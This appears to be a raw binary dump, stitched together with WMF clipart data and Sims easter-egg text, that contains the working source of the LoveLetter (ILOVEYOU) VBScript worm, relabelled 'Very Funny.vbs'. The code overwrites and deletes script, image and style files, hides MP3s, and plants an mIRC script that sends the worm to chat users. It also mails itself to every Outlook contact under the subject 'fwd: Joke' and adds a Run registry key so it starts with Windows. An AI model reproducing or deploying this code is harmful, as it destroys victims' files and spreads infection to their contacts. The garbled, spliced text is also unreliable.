regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
����         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        ume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send�  ���All Categories c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           on
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
                  nd if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     #�C(B���� �Q!�	���ۺ��SB*@ܪ�� �3�!ʋ���4	(�������TB�����#32����ri*9���ą�9

Z��4�������ab)����#!���ʀڜ!I,
	�����"��
���"pI	�	�3'#b������(A(�ڬ����%�#ˌ��q0(1 	���Ȕ�S����1!�Y�
T�H�ɠ�ʀ�"�Z?��		A@)������r	��@R18���	�ɐ�%s�H����ؙ���$"2���܈���8Х���S:p;����'"��ɨ�E#��p%�1��ڋ��( 0b�#P+���Sv0�ʐ�
1��
��������W7:x�뚫�$bb���"$������sa0(�����������I,[O �����.-
))2(-����3(M9((%��Ѳ����)X#4���� �HII��������ȋ##)�������2)i3������� ���)���ؙ�H: �
̚������ж�1 ���
 3S���ʙ�#8rI�#����2C;I+����qv�����@p)������ɯ���� �������)���1'��� R����DG*��r�4(K ,i�ؒ��% (�856+���蘀��H ��������)���X�	*�$�!	
 9BvaA�1!�����2���飹���=�������� 	���� �2@�����I�H ��$���05�r��I�4�#T ��,�	� �	�˘�2Э�ȝ��ݑ�� �
���'$ �A��	%Q0�)0
��'	 ����(�E�b̩��1ȃ��4�	x
#ꀠ��ʚ�� ���I�3���Q�$���pH �#c711"	��2BB������4
2���ۘ��� �������qɫ����a3H�ۤ�#&"���T455�S	!��HѰ�+�+����	����&��5�ɿ!�����b!���22p!	"��Hw�����F2����# B�8�r6�����9H�ˠ������꺸�#!:	����d !�����Rt54#H�2"t-2����#� ɚ�25;!�!���"�	��D�2	��ڍ��!؞�˪�# ��&�3b�B�7B�2	d4QA���GC��˪�� ɽ���	��ݔ�# 1	!���T�s�B�
7���"�9$�1�	  ���4�t�( ��#�!�$�R���<�����Ϩ�����&�Q$(����!��FS!
����U4� �`����!�	�̽��"G$1
����5�87�1�� ��
� ��$�!�#�s� 	�q�2Cw41#���S�0 �3ə��#������ ꛙ܀ 2����q
5���t�(
q� ��"$BA(�"0�ۀ�2����"������	�˺��1�	����E�A5S�2�C�D ��6�%�"����B���'54	���538 ����2�"���"��3����������ɑ1G05�3�17�c B�2��! ����(��T�!ˁ��� ڂ�R�A�"�  ����������"6�(�����#�葁t1 �3�R6R�1��0���D�"�"���܈��	몙����4�B� "!
R�	������!���$0cR"�3�1��D1+�uB�!�
$�#B1���٩�������25
	�ʃ�T����2�5�0�S�"� u�3 c0 ��3*3���ɭ�C���ܜ��#T0$����� ������(�!�1���&#0�c"U 1�D�"� ���AE!��ʨ��������
���#�s��۩�	��V�B��#���2cB �"%"
���F�(�w�8T
2�	��4��6�2��	����	��4�2���ʈ��#�3���!�ʼ���2�!U�1�
c�1�&�$3��c������2���r� ���������1`�	���AB͉ʐ�EB���D��'S��� �2�R�!%�%�!�
	pT�)پ������2� �����0ʛ�����3	��'cA1���� 3u�R�!5@�����6�	�)��٭�������5+a�(��R�	�"�
��� �U�A��63"0F"&�B���R�	��D�8��#�Q�P�
�������(��KA�
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            `	"��*
�ك�������) ��� 4��Ȅ����qD�� ��P*���3�	�6�2A��#��Z��"���ͽ��������)w

�+r���1������B�R�;�P� �	�ز������#�1� "�8�c���5�B"���!����㸒!b��٘�3����������
@��!����&�1c��#�6(C���t 
���s��X 1�0�- �"��b ���[�X��"�R�YP�ڛ��)��F���%�2;+21!�AR�! 8��U���aɘ(
�`�s��ɫ	ਁ! �	 �a�Fs��rR�����2R"/��3" ˺("��p8�������`H�ǩ� 	���������)H��<:��AQ�����AB��¡+;�ˁ�����$#,ɺ��������*,��A!  �둸��88���bu!�P$&6XH������'5(����E70`��#�	
���E#(����$PA�����#d��U 14@P �鉘�#52��12 	�����2����t2$T������!$@�
��WD1���� 1�	0�B !���h&9��s8�����I@��#틨-5�)�ʘ��Q�á�@���4b�
��P������*�s�41��왊��� A2�d�Qb�ʔ�Q(�(��5�!�����1$�S�P���@��3�(Q����$#
0���2�Ʌ%R(�����(�0+��١B(�����$ʋ��D��� ʙ@"����($y9�����!
4������6v1)�ܚ��# �C�� 횡SB 
��W�R�	����3�"Tܨ#ES(�ܩ�*	鹙� ���F�D�Y���0��4����	(ڹ� ��@;����3(�ꄃB1����bB���Ɂ���Bˋ��sD
	ʫ��2����R���7D1(����"��1	h܀��T� t�����sۨ��4�� ��ɩ�������"#Q8�ܸ��#,��1ˈ��CE�12�(��V4!���9"���F"
���%#"���2����S�
Aڎ�B�	s(*��%A���� !D�B��B�������E!��ɢR�����8 ��%�@ �˫ʺꀠC5���R�	�c�Bɉ@(�ܡ�43	$�B��ȐF"(���3��wAA�����t# ���	���t�8��T�)"ٜ��Ts�
��CB�������f	�������ȃq0���5R0��
3ꋔ�01�����CT 1CD)��ɐ�"
���ɉ �"U@�Ɂ#)1*�"�!�A�R�7�A�����4)�ݻ��$�1��I��ʨ�5Q0	�	��ܰ�u"(ۀ�	S�7�H˙��#S��ܑ�!�d�RB��ں�!!������570(������20�ٰ�F� ��! ����d�8s����� ��S�
���2P�����1쪠P��6�! !5�B6	)���1C�
��"BQ��SA0�����B"�뒒$C��4�(��1��ރ�S R (!����3$)�͈��"� 8������! 4�)
�����0B�	���B!R���DQB��)��'T1"������TA닺ې� �%� ��&�1$�
���
��e��ˁ�"BR�ۘ��1������"�� �$4F)�끩3��ˀ��4�Ct3 U�3�B��A	���$D!1����� �)�ˀ#Q"��D)P����SF!�
��	��#GBR	쩠GB!��˙��"�����ۂ�3R*����2�� ���3�8R���6���S����Ft10 ����%�2�3����  �&�2S��% 2 	"�!!'���t�!�611���(�ڄ�3 ��Ș �ݩ�7D1(�˻��2!������2%	!�t�0����u!����4C1����"�s�ۼ�� ��BR��ˑ�C	B������TB۩�CR �!˩��"B���$�����!"��ʸ�#)��t����E2����Dˈ�3+��T43�B��3�9�
����ٺ&�A��� #A0��SP����wEY1Ί���!�!���ꩁ�9�����(��ؠ#
C���فR!�Y��4ȡ� ���2r/
z��<+%u��
�����*@8) ���xb����
�œ)ŧ  ����ⵉ
)@���%u�	����3
	�	::�ݒ�QB"	��qQ�"RB!B!!�˱�4�ܺ�!C�+rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\W����         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                         a new "Did You Know?" box will appear until you know all we do. If you are not interested then click "Don't Show This Again" but come on you want to know ... you know you do! ZZZ - DO NOT TRANSLATE - EASTER EGG TEXT - Only Appears in English Version Will Wright - Game Designer. Will first thought of "The Sims" shortly after the original SimCity. It took this long for technology to catch up with Will's vision. In the Maxis Offices we have a mock-up design for the original idea of the Sims. Though the technology is far more advanced, the actual game does not vary much from this proto-type. ZZZ - DO 